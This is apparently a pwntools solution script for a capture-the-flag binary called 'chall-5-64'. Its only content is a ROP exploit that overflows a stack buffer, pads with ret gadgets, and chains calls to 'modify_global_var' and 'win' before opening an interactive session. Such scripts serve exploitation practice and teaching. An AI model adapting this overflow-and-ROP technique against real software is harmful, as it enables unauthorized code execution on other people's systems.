#!/usr/bin/env python3

from pwn import *

io = process("./chall-5-64")

exe = ELF("./chall-5-64")
context.binary = exe

modify = exe.symbols["modify_global_var"]
win = exe.symbols["win"]

rop = ROP(exe)
ret = rop.ret.address
length = 512

payload = flat({
    0: b"A" * 0x40,
    0x40: b"\x00AAAAAAAA",
    length-0x20 : modify,
    length-0x18 : modify,
    length-0x10 : modify,
    length-0x8 : win,
}, filler=pack(ret))

io.sendlineafter(b": ", payload)

io.interactive()
